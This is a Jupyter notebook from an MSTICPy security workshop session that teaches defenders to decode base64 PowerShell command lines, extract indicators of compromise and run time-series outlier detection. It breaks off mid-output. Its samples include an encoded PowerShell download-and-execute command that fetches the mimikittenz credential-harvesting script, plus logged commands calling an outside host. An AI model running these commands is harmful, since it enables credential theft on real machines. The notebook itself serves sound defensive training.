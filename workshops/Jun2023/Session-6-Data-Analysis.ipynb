{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## MSTICPy and Notebooks in InfoSec\n",
    "\n",
    "---\n",
    "\n",
    "<h1 style=\"border: solid; padding:5pt; color:black; background-color:#909090\">Session 6 - Data analysis</h1>\n",
    "\n",
    "---\n",
    "\n",
    "## What this session covers:\n",
    "\n",
    "* Data Analysis capabilities in msticpy\n",
    "* Base 64 decoding\n",
    "* IoC Extraction\n",
    "* Outlier detection using Time Series Analysis\n",
    "\n",
    "\n",
    "## Prerequisites\n",
    "- Python >= 3.8 Environment\n",
    "- Jupyter installed\n",
    "- MSTICPy installed\n",
    "\n",
    "## Recommended\n",
    "- VS Code\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---\n",
    "\n",
    "# <a style=\"border: solid; padding:5pt; color:black; background-color:#909090\">Data Analysis capabilities in msticpy</a>\n",
    "\n",
    "---\n",
    "\n",
    "MSTICPy has several generic analysis and transformation functions. Some examples of transforms are:\n",
    "- Process tree building\n",
    "- decoding encoded and compressed data\n",
    "- IoC/observable extraction from data\n",
    "- Time series analysis\n",
    "- syslog parsing\n",
    "\n",
    "You can read more about the features in MSTICPy documentation.\n",
    " - [Data Analysis](https://msticpy.readthedocs.io/en/latest/DataAnalysis.html)\n",
    " - [Process Trees](https://msticpy.readthedocs.io/en/latest/visualization/ProcessTree.html)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "ExecuteTime": {
     "end_time": "2022-10-17T18:18:33.520024Z",
     "start_time": "2022-10-17T18:18:33.503259Z"
    }
   },
   "source": [
    "---\n",
    "\n",
    "# <a style=\"border: solid; padding:5pt; color:black; background-color:#909090\">Base 64 decoding using msticpy</a>\n",
    "\n",
    "---\n",
    "\n",
    "Often, Defenders have to bulk analyze the process execution commandline logs containing base64 encoded strings by decoding and analyzing them for malicious activity. \n",
    "This msticpy module allows you to extract base64 encoded content from a string or columns of Pandas DataFrame. \n",
    "\n",
    "Read more details - \n",
    "[Base64 Decoding and Unpacking](https://msticpy.readthedocs.io/en/latest/data_analysis/Base64Unpack.html)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2022-10-18T10:49:21.521976Z",
     "start_time": "2022-10-18T10:49:06.137141Z"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "env: MSTICPYCONFIG=./msticpyconfig.yaml\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "\n",
       "This product includes GeoLite2 data created by MaxMind, available from\n",
       "<a href=\"https://www.maxmind.com\">https://www.maxmind.com</a>.\n"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "\n",
       "This library uses services provided by ipstack.\n",
       "<a href=\"https://ipstack.com\">https://ipstack.com</a>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "%env MSTICPYCONFIG=./msticpyconfig.yaml\n",
    "import msticpy as mp \n",
    "mp.init_notebook()\n",
    "pd.set_option('display.max_colwidth', 200)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "In order to find module path, you can use search feature as shows below"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2022-10-18T10:49:23.600032Z",
     "start_time": "2022-10-18T10:49:23.584743Z"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "\n",
       "    <style>\n",
       "        .table_mod {border-collapse: collapse; width: 50%;}\n",
       "        .cell_mod {border: 1px solid #ddd !important;\n",
       "            text-align: left !important; padding: 15px !important;}\n",
       "    </style>\n",
       "    <h4>Modules matching 'base64'</h4>\n",
       "    <table class='table_mod'>\n",
       "    <tr class='cell_mod'><th>Module</th><th>Help</th></tr>\n",
       "    <tr class='cell_mod'><td>msticpy.transform.base64unpack</td><td><a href=https://msticpy.readthedocs.io/en/latest/api/msticpy.transform.base64unpack.html target='_blank'>msticpy.transform.base64unpack</a></td></tr>\n",
       "    </table>\n",
       "    "
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "mp.search('base64')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Once you identified the module path, you can use either on a input string or columns of Padas dataframe.\n",
    "\n",
    "Exmaple powershell command string with base64 encoded data. We can put this as input in next step.\n",
    "\n",
    "`powershell -enc SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vcHV0dGVycGFuZGEvbWltaWtpdHRlbnovbWFzdGVyL0ludm9rZS1taW1pa2l0dGVuei5wczEnKTsgSW52b2tlLW1pbWlraXR0ZW56Cg==`"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2022-10-18T10:49:41.410325Z",
     "start_time": "2022-10-18T10:49:41.397106Z"
    }
   },
   "outputs": [
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "d3a6dbf9597e46038e2ed1d708ca85fb",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "Text(value='', description='Enter a commandline with powershell base64 encoded', layout=Layout(width='50%'), s…"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "cmdline = mp.nbwidgets.GetText(prompt='Enter a commandline with powershell base64 encoded', auto_display=True);"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "in order to decode, you can use `unpack` method within `base64unpack` tranform module/\n",
    "The library returns following information.\n",
    "- decoded string (if decodable to utf-8 or utf-16)\n",
    "- hashes of the decoded segment (MD5, SHA1, SHA256)\n",
    "- string of printable byte values (e.g. for submission to a disassembler)\n",
    "- the detected decoded file type (limited)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2022-10-18T10:49:52.856745Z",
     "start_time": "2022-10-18T10:49:52.841886Z"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "\"powershell -enc <decoded type='string' name='[None]' index='1' depth='1'>IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/putterpanda/mimikittenz/master/Invoke-mimikittenz.ps1'); Invoke-mimikittenz\\n</decoded>\""
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# Decode the string\n",
    "base64_dec_str = mp.transform.base64unpack.unpack(input_string=cmdline.value)\n",
    "\n",
    "# Print decoded string\n",
    "display(base64_dec_str[0])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2022-10-18T10:49:58.535524Z",
     "start_time": "2022-10-18T10:49:58.527773Z"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "\"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/putterpanda/mimikittenz/master/Invoke-mimikittenz.ps1'); Invoke-mimikittenz\\n\""
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# Print decoded string\n",
    "display(base64_dec_str[1]['decoded_string'][0])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## <a style=\"border: solid; padding:5pt; color:black; background-color:#309030\">Task 1 - Base 64 decoding using dataframe as input</a>\n",
    "\n",
    "Perform base 64 encoding on the data loaded from previous step.\n",
    "1. Choose the columns containing powershell base64 command line logs.\n",
    "2. Use python help (`process_enc_logs.mp.b64unpack` or `mp.transform.base64unpack.unpack_df`)\n",
    "   to find correct parameters such as input data and column name.\n",
    "3. Finally display the results\n",
    "\n",
    "<br>\n",
    "<details>\n",
    "<summary>Hints...</summary>\n",
    "<li>Use the cell below to identify the columns containing powershell base64 encoded logs.</li>\n",
    "<li>Use data and column to specify input dataframe and column containing powershell command line</li>\n",
    "<li>The final command to decode should look like one of the following.\n",
    "\n",
    "<pre>\n",
    "    # using the pandas msticpy accessor\n",
    "    process_enc_logs.mp.b64extract(column='CommandLine')\n",
    "</pre>\n",
    "\n",
    "<pre>\n",
    "    # using the standalone function\n",
    "    mp.transform.base64unpack.unpack_df(data=process_enc_logs, column='CommandLine')\n",
    "</pre>\n",
    "</li>\n",
    "<ul>\n",
    "</ul>\n",
    "</details>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2022-10-18T10:50:39.999012Z",
     "start_time": "2022-10-18T10:50:39.893771Z"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>TenantId</th>\n",
       "      <th>Account</th>\n",
       "      <th>EventID</th>\n",
       "      <th>TimeGenerated</th>\n",
       "      <th>Computer</th>\n",
       "      <th>SubjectUserSid</th>\n",
       "      <th>SubjectUserName</th>\n",
       "      <th>SubjectDomainName</th>\n",
       "      <th>SubjectLogonId</th>\n",
       "      <th>NewProcessId</th>\n",
       "      <th>NewProcessName</th>\n",
       "      <th>TokenElevationType</th>\n",
       "      <th>ProcessId</th>\n",
       "      <th>CommandLine</th>\n",
       "      <th>ParentProcessName</th>\n",
       "      <th>TargetLogonId</th>\n",
       "      <th>SourceComputerId</th>\n",
       "      <th>TimeCreatedUtc</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>968</th>\n",
       "      <td>52b1ab41-869e-4138-9e40-2a4457f09bf0</td>\n",
       "      <td>MSTICAlertsWin1\\MSTICAdmin</td>\n",
       "      <td>4688</td>\n",
       "      <td>2019-02-09 23:26:48.107</td>\n",
       "      <td>MSTICAlertsWin1</td>\n",
       "      <td>S-1-5-21-996632719-2361334927-4038480536-500</td>\n",
       "      <td>MSTICAdmin</td>\n",
       "      <td>MSTICAlertsWin1</td>\n",
       "      <td>0xab5a5ac</td>\n",
       "      <td>0x1260</td>\n",
       "      <td>C:\\W!ndows\\System32\\powershell.exe</td>\n",
       "      <td>%%1936</td>\n",
       "      <td>0x1684</td>\n",
       "      <td>.\\powershell  -enc LU5vbmludGVyYWN0aXZlIC1Ob3Byb2ZpbGUgLUNvbW1hbmQgIkludm9rZS1FeHByZXNzaW9uIEdldC1Qcm9jZXNzOyBJbnZva2UtV2ViUmVxdWVzdCAtVXJpIGh0dHA6Ly93aDQwMWsub3JnL2dldHBzIg==</td>\n",
       "      <td>C:\\Windows\\System32\\cmd.exe</td>\n",
       "      <td>0x0</td>\n",
       "      <td>263a788b-6526-4cdc-8ed9-d79402fe4aa0</td>\n",
       "      <td>2019-02-09 23:26:48.107</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>7452</th>\n",
       "      <td>52b1ab41-869e-4138-9e40-2a4457f09bf0</td>\n",
       "      <td>MSTICAlertsWin1\\MSTICAdmin</td>\n",
       "      <td>4688</td>\n",
       "      <td>2019-02-13 22:03:42.860</td>\n",
       "      <td>MSTICAlertsWin1</td>\n",
       "      <td>S-1-5-21-996632719-2361334927-4038480536-500</td>\n",
       "      <td>MSTICAdmin</td>\n",
       "      <td>MSTICAlertsWin1</td>\n",
       "      <td>0x1e821b5</td>\n",
       "      <td>0x61e0</td>\n",
       "      <td>C:\\W!ndows\\System32\\powershell.exe</td>\n",
       "      <td>%%1936</td>\n",
       "      <td>0x7b20</td>\n",
       "      <td>.\\powershell  -enc LU5vbmludGVyYWN0aXZlIC1Ob3Byb2ZpbGUgLUNvbW1hbmQgIkludm9rZS1FeHByZXNzaW9uIEdldC1Qcm9jZXNzOyBJbnZva2UtV2ViUmVxdWVzdCAtVXJpIGh0dHA6Ly93aDQwMWsub3JnL2dldHBzIg==</td>\n",
       "      <td>C:\\Windows\\System32\\cmd.exe</td>\n",
       "      <td>0x0</td>\n",
       "      <td>263a788b-6526-4cdc-8ed9-d79402fe4aa0</td>\n",
       "      <td>2019-02-13 22:03:42.860</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                  TenantId                     Account  \\\n",
       "968   52b1ab41-869e-4138-9e40-2a4457f09bf0  MSTICAlertsWin1\\MSTICAdmin   \n",
       "7452  52b1ab41-869e-4138-9e40-2a4457f09bf0  MSTICAlertsWin1\\MSTICAdmin   \n",
       "\n",
       "      EventID           TimeGenerated         Computer  \\\n",
       "968      4688 2019-02-09 23:26:48.107  MSTICAlertsWin1   \n",
       "7452     4688 2019-02-13 22:03:42.860  MSTICAlertsWin1   \n",
       "\n",
       "                                    SubjectUserSid SubjectUserName  \\\n",
       "968   S-1-5-21-996632719-2361334927-4038480536-500      MSTICAdmin   \n",
       "7452  S-1-5-21-996632719-2361334927-4038480536-500      MSTICAdmin   \n",
       "\n",
       "     SubjectDomainName SubjectLogonId NewProcessId  \\\n",
       "968    MSTICAlertsWin1      0xab5a5ac       0x1260   \n",
       "7452   MSTICAlertsWin1      0x1e821b5       0x61e0   \n",
       "\n",
       "                          NewProcessName TokenElevationType ProcessId  \\\n",
       "968   C:\\W!ndows\\System32\\powershell.exe             %%1936    0x1684   \n",
       "7452  C:\\W!ndows\\System32\\powershell.exe             %%1936    0x7b20   \n",
       "\n",
       "                                                                                                                                                                          CommandLine  \\\n",
       "968   .\\powershell  -enc LU5vbmludGVyYWN0aXZlIC1Ob3Byb2ZpbGUgLUNvbW1hbmQgIkludm9rZS1FeHByZXNzaW9uIEdldC1Qcm9jZXNzOyBJbnZva2UtV2ViUmVxdWVzdCAtVXJpIGh0dHA6Ly93aDQwMWsub3JnL2dldHBzIg==   \n",
       "7452  .\\powershell  -enc LU5vbmludGVyYWN0aXZlIC1Ob3Byb2ZpbGUgLUNvbW1hbmQgIkludm9rZS1FeHByZXNzaW9uIEdldC1Qcm9jZXNzOyBJbnZva2UtV2ViUmVxdWVzdCAtVXJpIGh0dHA6Ly93aDQwMWsub3JnL2dldHBzIg==   \n",
       "\n",
       "                ParentProcessName TargetLogonId  \\\n",
       "968   C:\\Windows\\System32\\cmd.exe           0x0   \n",
       "7452  C:\\Windows\\System32\\cmd.exe           0x0   \n",
       "\n",
       "                          SourceComputerId          TimeCreatedUtc  \n",
       "968   263a788b-6526-4cdc-8ed9-d79402fe4aa0 2019-02-09 23:26:48.107  \n",
       "7452  263a788b-6526-4cdc-8ed9-d79402fe4aa0 2019-02-13 22:03:42.860  "
      ]
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Load test data\n",
    "process_logs = pd.read_pickle('data/processes_on_host.pkl')\n",
    "# Filter the records with powershell base 64 encoded data\n",
    "process_enc_logs = process_logs[process_logs['CommandLine'].str.contains(\"-enc\")]\n",
    "process_enc_logs"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2022-10-18T09:15:27.727138Z",
     "start_time": "2022-10-18T09:15:27.699932Z"
    }
   },
   "outputs": [],
   "source": [
    "# specify the data and column parameters\n",
    "dec_df = \n",
    "\n",
    "# display dataframe\n",
    "display(dec_df)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "ExecuteTime": {
     "end_time": "2022-10-17T18:21:27.532198Z",
     "start_time": "2022-10-17T18:21:27.526776Z"
    }
   },
   "source": [
    "---\n",
    "\n",
    "# <a style=\"border: solid; padding:5pt; color:black; background-color:#909090\">IoC extraction using msticpy</a>\n",
    "\n",
    "---\n",
    "\n",
    "This module allows you to extract IoC patterns from a string or a DataFrame. This will be useful feature for defender for faster extraction and perform follow-up activities on those IoCs.\n",
    "\n",
    "For more detail - [IoC Extraction](https://msticpy.readthedocs.io/en/latest/data_analysis/IoCExtract.html)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "You can use this module similar fashion either by providing input string or passing a dataframe with multiple logs containing IoCs.\n",
    "\n",
    "Enter sample command line in the next cell to see how it works. \n",
    "`netsh  start capture=yes IPv4.Address=1.2.3.4 tracefile=C:\\\\Users\\\\user\\\\AppData\\\\Local\\\\Temp\\\\bzzzzzz.txt`"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2022-10-18T10:50:50.702927Z",
     "start_time": "2022-10-18T10:50:50.688563Z"
    }
   },
   "outputs": [
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "e9409992e39346a1ad6a05801fd86605",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "Text(value='', description='Enter a commandline to extract IoCs', layout=Layout(width='50%'), style=Descriptio…"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "cmdline = mp.nbwidgets.GetText(prompt='Enter a commandline to extract IoCs', auto_display=True);"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "You can use the `extract` method from `iocextract` class and provide input string."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2022-10-18T10:51:32.418188Z",
     "start_time": "2022-10-18T10:51:32.403798Z"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "\n",
       "    <style>\n",
       "        .table_mod {border-collapse: collapse; width: 50%;}\n",
       "        .cell_mod {border: 1px solid #ddd !important;\n",
       "            text-align: left !important; padding: 15px !important;}\n",
       "    </style>\n",
       "    <h4>Modules matching 'ioc'</h4>\n",
       "    <table class='table_mod'>\n",
       "    <tr class='cell_mod'><th>Module</th><th>Help</th></tr>\n",
       "    <tr class='cell_mod'><td>msticpy.transform.iocextract</td><td><a href=https://msticpy.readthedocs.io/en/latest/api/msticpy.transform.iocextract.html target='_blank'>msticpy.transform.iocextract</a></td></tr>\n",
       "    </table>\n",
       "    "
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# Find the module path\n",
    "mp.search('ioc')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2022-10-18T10:51:07.673646Z",
     "start_time": "2022-10-18T10:51:07.657997Z"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "Potential IoCs found in alert process:\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "defaultdict(set,\n",
       "            {'ipv4': {'1.2.3.4'},\n",
       "             'windows_path': {'C:\\\\\\\\Users\\\\\\\\user\\\\\\\\AppData\\\\\\\\Local\\\\\\\\Temp\\\\\\\\bzzzzzz.txt'}})"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "ioc_extractor = mp.transform.IoCExtract()\n",
    "\n",
    "# any IoCs in the string?\n",
    "iocs_found = ioc_extractor.extract(cmdline.value)\n",
    "\n",
    "if iocs_found:\n",
    "    print('\\nPotential IoCs found in alert process:')\n",
    "    display(iocs_found)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "ExecuteTime": {
     "end_time": "2022-10-17T18:22:13.457405Z",
     "start_time": "2022-10-17T18:22:13.452500Z"
    }
   },
   "source": [
    "## <a style=\"border: solid; padding:5pt; color:black; background-color:#309030\">Task 2 - Extract IoCs from log dataset</a>\n",
    "\n",
    "Perform IoC extraction on the data loaded from previous step (process_enc_logs).\n",
    "1. Choose the columns containing command line logs which may have IoCs and need to be extracted.\n",
    "2. Use either of these (use Python help to find correct parameters such as input data and column name):\n",
    "   - the DataFrame accessor process_enc_logs.mp.iocextract() function\n",
    "   - the `extract` method of the `mp.transform.IoCextractor` class\n",
    "3. Finally display the results\n",
    "\n",
    "\n",
    "<br>\n",
    "<details>\n",
    "<summary>Hints...</summary>\n",
    "<li>Use the cell below to identify the columns containing powershell base64 encoded logs.</li>\n",
    "<li>Use data and column to specify input dataframe and column containing powershell commandline</li>\n",
    "<li>Use the DataFrame accessor\n",
    "<pre>\n",
    "    process_logs.mp.iocextract(columns='CommandLine')\n",
    "</pre>\n",
    "</li>\n",
    "<li>Or use the IoCExtract class method\n",
    "<pre>\n",
    "    ioc_extractor.extract(data=process_enc_logs, columns=['CommandLine'])\n",
    "</pre>\n",
    "</li>\n",
    "<ul>\n",
    "</ul>\n",
    "</details>\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2022-10-18T09:06:46.721439Z",
     "start_time": "2022-10-18T09:06:44.863271Z"
    }
   },
   "outputs": [],
   "source": [
    "ioc_df = \n",
    "\n",
    "if len(ioc_df):\n",
    "    display(HTML(\"<h3>IoC patterns found in process tree.</h3>\"))\n",
    "    display(ioc_df[ioc_df['IoCType']=='url'])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "ioc_df = \n",
    "\n",
    "if len(ioc_df):\n",
    "    display(HTML(\"<h3>IoC patterns found in process tree.</h3>\"))\n",
    "    display(ioc_df[ioc_df['IoCType']=='ipv4'])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---\n",
    "\n",
    "# <a style=\"border: solid; padding:5pt; color:black; background-color:#909090\">Time Series analysis using msticpy</a>\n",
    "\n",
    "---\n",
    "\n",
    "MSTICPy has functions to calculate and display time series decomposition results. These can be useful to spot time-based anomalies in something that has a predictable seasonal pattern\n",
    "\n",
    "Fore more details , check the documentation\n",
    "[Time Series Analysis](https://msticpy.readthedocs.io/en/latest/visualization/TimeSeriesAnomalies.html)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2022-10-18T10:51:41.963112Z",
     "start_time": "2022-10-18T10:51:41.949699Z"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "\n",
       "    <style>\n",
       "        .table_mod {border-collapse: collapse; width: 50%;}\n",
       "        .cell_mod {border: 1px solid #ddd !important;\n",
       "            text-align: left !important; padding: 15px !important;}\n",
       "    </style>\n",
       "    <h4>Modules matching 'timeseries'</h4>\n",
       "    <table class='table_mod'>\n",
       "    <tr class='cell_mod'><th>Module</th><th>Help</th></tr>\n",
       "    <tr class='cell_mod'><td>msticpy.analysis.timeseries</td><td><a href=https://msticpy.readthedocs.io/en/latest/api/msticpy.analysis.timeseries.html target='_blank'>msticpy.analysis.timeseries</a></td></tr>\n",
       "<tr class='cell_mod'><td>msticpy.vis.timeseries</td><td><a href=https://msticpy.readthedocs.io/en/latest/api/msticpy.vis.timeseries.html target='_blank'>msticpy.vis.timeseries</a></td></tr>\n",
       "    </table>\n",
       "    "
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "mp.search('timeseries')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "MSTICPy has a number of built-in queries for MS Sentinel to support time series analysis.\n",
    "\n",
    "- MultiDataSource.get_timeseries_anomalies\n",
    "- MultiDataSource.get_timeseries_data\n",
    "- MultiDataSource.get_timeseries_decompose\n",
    "- MultiDataSource.plot_timeseries_datawithbaseline\n",
    "- MultiDataSource.plot_timeseries_scoreanomolies\n",
    "\n",
    "To use these you will need to connect to sentinel workspace\n",
    "\n",
    "`# Authentication\n",
    "qry_prov = mp.QueryProvider(\"MSSentinel\")\n",
    "qry_prov.connect(mp.WorkspaceConfig(workspace=\"cybersecuritysoc\"))`\n",
    "\n",
    "An example of running the query against connected sentinel workspace and retrieve the time series data.\n",
    "\n",
    "```\n",
    "#Specify start and end timestamps\n",
    "start='2022-09-01 00:00:00.000000'\n",
    "end='2020-10-01 00:00:00.000000'\n",
    "\n",
    "#Execute the query by passing required and optional parameters\n",
    "time_series_data = qry_prov.MultiDataSource.get_timeseries_data(\n",
    "    start=start,\n",
    "    end=end,\n",
    "    table=\"CommonSecurityLog\",\n",
    "    timestampcolumn=\"TimeGenerated\",\n",
    "    aggregatecolumn=\"SentBytes\",\n",
    "    groupbycolumn=\"DeviceVendor\",\n",
    "    aggregatefunction=\"sum(SentBytes)\",\n",
    "    where_clause='| where DeviceVendor==\"Fortinet\"',\n",
    "    add_query_items='| mv-expand TimeGenerated to typeof(datetime), SentBytes to typeof(long)',\n",
    ")\n",
    "#display the output\n",
    "time_series_data\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## <a style=\"border: solid; padding:5pt; color:black; background-color:#309030\">Task 3 - Find outliers using time series analysis on network data</a>\n",
    "\n",
    "Perform Time series analysis on the sample data loaded in the first step.\n",
    "1. from the loaded dataframe, use python help (`ts_df.mp_timeseries.analyze`) to find correct parameters such as data_column, seasonal parameteres if known otherwise keep default.\n",
    "3. Finally plot the time series of the results from previous steps using `ts_decomp_df.mp_timeseries.plot`\n",
    "\n",
    "<br>\n",
    "<details>\n",
    "<summary>Hints...</summary>\n",
    "<li>Use the cell below to identify the columns containing time series numerical data.</li>\n",
    "<li>The final command to do time series should look like:\n",
    "<pre>\n",
    "    ts_df.mp_timeseries.analyze(\n",
    "        # time_column=\"TimeGenerated\"  - if the DF is not indexed by timestamp\n",
    "        data_column=\"TotalBytesSent\",\n",
    "        seasonal=7,\n",
    "        period=24\n",
    "    )\n",
    "</pre>\n",
    "</li>\n",
    "<li>You can also plot the results and outliers using the command.\n",
    "<pre>\n",
    "    ts_decomp_df.mp_timeseries.plot(\n",
    "        y=\"TotalBytesSent\",\n",
    "    );\n",
    "</pre>\n",
    "</li>\n",
    "<ul>\n",
    "</ul>\n",
    "</details>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2022-10-18T10:53:17.855636Z",
     "start_time": "2022-10-18T10:53:17.841786Z"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>TotalBytesSent</th>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>TimeGenerated</th>\n",
       "      <th></th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>2020-07-06 00:00:00+00:00</th>\n",
       "      <td>10823</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2020-07-06 01:00:00+00:00</th>\n",
       "      <td>14821</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2020-07-06 02:00:00+00:00</th>\n",
       "      <td>13532</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2020-07-06 03:00:00+00:00</th>\n",
       "      <td>11947</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2020-07-06 04:00:00+00:00</th>\n",
       "      <td>11193</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>...</th>\n",
       "      <td>...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2020-07-12 19:00:00+00:00</th>\n",
       "      <td>18166</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2020-07-12 20:00:00+00:00</th>\n",
       "      <td>13830</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2020-07-12 21:00:00+00:00</th>\n",
       "      <td>13350</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2020-07-12 22:00:00+00:00</th>\n",
       "      <td>11842</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2020-07-12 23:00:00+00:00</th>\n",
       "      <td>11111</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>168 rows × 1 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "                          TotalBytesSent\n",
       "TimeGenerated                           \n",
       "2020-07-06 00:00:00+00:00          10823\n",
       "2020-07-06 01:00:00+00:00          14821\n",
       "2020-07-06 02:00:00+00:00          13532\n",
       "2020-07-06 03:00:00+00:00          11947\n",
       "2020-07-06 04:00:00+00:00          11193\n",
       "...                                  ...\n",
       "2020-07-12 19:00:00+00:00          18166\n",
       "2020-07-12 20:00:00+00:00          13830\n",
       "2020-07-12 21:00:00+00:00          13350\n",
       "2020-07-12 22:00:00+00:00          11842\n",
       "2020-07-12 23:00:00+00:00          11111\n",
       "\n",
       "[168 rows x 1 columns]"
      ]
     },
     "execution_count": 13,
     "metadata": {},
